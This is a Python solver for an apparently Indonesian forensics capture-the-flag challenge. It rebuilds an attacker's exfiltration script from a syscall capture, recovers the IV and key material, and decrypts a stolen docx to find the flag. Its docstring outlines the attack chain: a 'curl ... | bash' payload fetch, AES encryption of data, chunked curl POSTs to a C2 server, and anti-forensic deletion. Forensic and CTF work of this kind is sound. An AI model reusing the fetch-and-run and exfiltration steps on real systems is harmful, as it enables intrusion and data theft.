#!/usr/bin/env python3
"""Solver end-to-end: capture.scap -> Hasil_Sidang_2026.docx -> flag.

    python3 solve.py ../capture.scap

Rantai serangan yang direkonstruksi dari capture:

    bash -c 'curl .../auto_clean.deb | bash'          stage-1 (bashfuscator)
      +- curl .../Apaniii            -> keymaterial   SSH ed25519 pubkey
      +- sha256sum --tag keymaterial -> _h            lalu dir-nya di-rm
      +- python3 -                                    AES-256-CBC, IV = _h[:32]
      +- split -n 3 + xxd -p                          3 potong hex
      +- /tmp/.send_data.sh                           3x curl POST ke C2
      +- rm -rf                                       anti-forensik

Kunci solve: capture pakai snaplen 80 B, tapi stage-1 menulis
/tmp/.send_data.sh dalam potongan 64 B (lihat fungsi _emit-nya), jadi
seluruh ciphertext ikut terekam utuh di dalam capture.
"""

import argparse
import hashlib
import os
import re
import sys
import zipfile

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

import scap

HERE = os.path.dirname(os.path.abspath(__file__))
KEY_URL = "https://raw.githubusercontent.com/inoginnsh/Apanii2/refs/heads/main/Apaniii"
DEFAULT_KEYMATERIAL = os.path.join(HERE, "payloads", "keymaterial.txt")

FLAG_RE = re.compile(rb"(?i)[a-z0-9_]{2,20}\{[^}]{4,120}\}")

NOISE = re.compile(
    r"ls -la /home/notaris|cat /home/notaris|grep -ril sidang|date -Is|"
    r"stat /home/notaris|cp /home/notaris|sleep |rm -f /tmp/\.~lock|curl -fsS -o /dev/null"
)


def step(n, msg):
    print(f"\n[{n}] {msg}\n{'-' * (len(msg) + 4)}")


# --------------------------------------------------------------------------
# 1. timeline
# --------------------------------------------------------------------------
def show_timeline(capture):
    step(1, "Timeline execve (decoy loop difilter)")
    lines = scap.fields(
        capture,
        "evt.type=execve and evt.dir=<",
        "%evt.time %proc.pid %proc.ppid %proc.name %proc.exeline",
    )
    kept = [ln for ln in lines if not NOISE.search(ln)]
    for ln in kept:
        print("   ", ln)
    print(f"\n    {len(lines)} execve total, {len(kept)} non-decoy")


# --------------------------------------------------------------------------
# 2-3. ciphertext dari /tmp/.send_data.sh
# --------------------------------------------------------------------------
def recover_ciphertext(capture, outdir):
    step(2, "Reassemble /tmp/.send_data.sh dari write syscall")
    filt = "fd.name=/tmp/.send_data.sh and evt.is_io_write=true"
    count, largest = scap.snaplen_report(capture, filt)
    print(f"    {count} buffer, terbesar {largest} B -> di bawah snaplen 80 B, utuh")

    script = scap.payload(capture, filt)
    open(os.path.join(outdir, "send_data.sh"), "wb").write(script)
    print(f"    {len(script)} B dipulihkan -> send_data.sh")
    for ln in re.sub(rb"[0-9a-f]{80,}", b"<HEX...>", script).splitlines():
        print("      ", ln.decode())

    step(3, "Gabungkan p1..p3 jadi ciphertext")
    parts = re.findall(rb'p([123])=([0-9a-f]+)', script)
    if len(parts) != 3:
        raise SystemExit(f"expected 3 chunks, got {len(parts)}")
    blob = bytes.fromhex(b"".join(h for _, h in sorted(parts)).decode())
    open(os.path.join(outdir, "hasil_sidang_enc.bin"), "wb").write(blob)
    print(f"    magic={blob[:8]!r} salt={blob[8:16].hex()} total={len(blob)} B")
    if blob[:8] != b"Salted__":
        raise SystemExit("header OpenSSL 'Salted__' tidak ditemukan")
    return blob


# --------------------------------------------------------------------------
# 4. IV dari stdin python3
# --------------------------------------------------------------------------
def recover_iv(capture):
    step(4, "Ambil IV dari 80 B pertama stdin `python3 -`")
    data = scap.payload(
        capture, "proc.name=python3 and evt.is_io_read=true and fd.num=0"
    )
    text = data.decode("utf-8", "replace")
    print(f"    {text!r}")
    m = re.search(r'iv="([0-9a-f]{32})"', text)
    if not m:
        raise SystemExit("IV tidak ketemu di stdin python3")
    print(f"    IV = {m.group(1)}")
    return m.group(1)


# --------------------------------------------------------------------------
# 5. keymaterial
# --------------------------------------------------------------------------
def recover_keymaterial(capture, iv_hex, cached, allow_fetch):
    step(5, "Pulihkan keymaterial (SSH pubkey) + verifikasi lewat oracle IV")
    partial = scap.payload(capture, "fd.name contains keymaterial and evt.is_io_write=true")
    print(f"    dari capture : {len(partial)} B (dipotong snaplen dari 106 B)")
    print(f"      {partial.decode('utf-8', 'replace')!r}")

    candidates = []
    if cached and os.path.exists(cached):
        candidates.append((cached, open(cached, "rb").read()))
    if allow_fetch:
        import urllib.request
        with urllib.request.urlopen(KEY_URL, timeout=30) as r:
            candidates.append((KEY_URL, r.read()))

    for origin, raw in candidates:
        km = raw.rstrip(b"\n")          # stage-1: printf %s "$(curl ...)"
        digest = hashlib.sha256(km).hexdigest()
        ok = digest[:32] == iv_hex
        print(f"    kandidat {origin}: sha256[:32]={digest[:32]} -> "
              f"{'COCOK dengan IV' if ok else 'tidak cocok'}")
        if ok:
            if not km.startswith(partial):
                raise SystemExit("kandidat tidak konsisten dengan byte di capture")
            print(f"    keymaterial ({len(km)} B): {km.decode()}")
            return km
    raise SystemExit(
        "keymaterial tidak terpulihkan. Sediakan file via --keymaterial "
        f"atau izinkan unduh dengan --fetch ({KEY_URL})"
    )


# --------------------------------------------------------------------------
# 6. dekripsi
# --------------------------------------------------------------------------
def decrypt(blob, keymaterial, iv_hex, outdir):
    step(6, "Turunkan kunci + dekripsi AES-256-CBC")
    salt, ct = blob[8:16], blob[16:]
    key = hashlib.sha256(keymaterial).hexdigest().encode()   # 64 B ASCII hex
    iv = bytes.fromhex(iv_hex)
    dk = hashlib.pbkdf2_hmac("sha256", key, salt, 10000, 48)
    print(f"    key  = sha256(keymaterial).hexdigest()  ({len(key)} B ASCII)")
    print(f"    iv   = bytes.fromhex(key[:32])          = {iv.hex()}")
    print(f"    dk   = pbkdf2_hmac(sha256, key, salt, 10000, 48)")
    print(f"    aes  = AES-256-CBC(dk[:32])             = {dk[:32].hex()}")

    pt = Cipher(algorithms.AES(dk[:32]), modes.CBC(iv)).decryptor().update(ct)
    pad = pt[-1]
    if not (1 <= pad <= 16) or pt[-pad:] != bytes([pad]) * pad:
        raise SystemExit("padding tidak valid -- kunci salah")
    pt = pt[:-pad]

    path = os.path.join(outdir, "Hasil_Sidang_2026.docx")
    open(path, "wb").write(pt)
    print(f"    plaintext {len(pt)} B, magic={pt[:4]!r} -> {path}")
    return path


# --------------------------------------------------------------------------
# 7. flag
# --------------------------------------------------------------------------
def extract_flag(path):
    step(7, "Cari flag di dalam docx")
    flags = []
    with zipfile.ZipFile(path) as z:
        for name in z.namelist():
            for m in FLAG_RE.finditer(z.read(name)):
                flags.append((name, m.group().decode("utf-8", "replace")))
    for name, f in flags:
        print(f"    {name}: {f}")
    return flags


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("capture", help="path ke capture.scap")
    ap.add_argument("-o", "--outdir", default=os.path.join(HERE, "out"))
    ap.add_argument("--keymaterial", default=DEFAULT_KEYMATERIAL,
                    help="salinan lokal file kunci (default: payloads/keymaterial.txt)")
    ap.add_argument("--fetch", action="store_true",
                    help=f"unduh keymaterial dari {KEY_URL}")
    args = ap.parse_args()

    os.makedirs(args.outdir, exist_ok=True)
    show_timeline(args.capture)
    blob = recover_ciphertext(args.capture, args.outdir)
    iv_hex = recover_iv(args.capture)
    km = recover_keymaterial(args.capture, iv_hex, args.keymaterial, args.fetch)
    docx = decrypt(blob, km, iv_hex, args.outdir)
    flags = extract_flag(docx)

    print("\n" + "=" * 60)
    for _, f in flags:
        print(f"  FLAG: {f}")
    print("=" * 60)
    return 0 if flags else 1


if __name__ == "__main__":
    sys.exit(main())
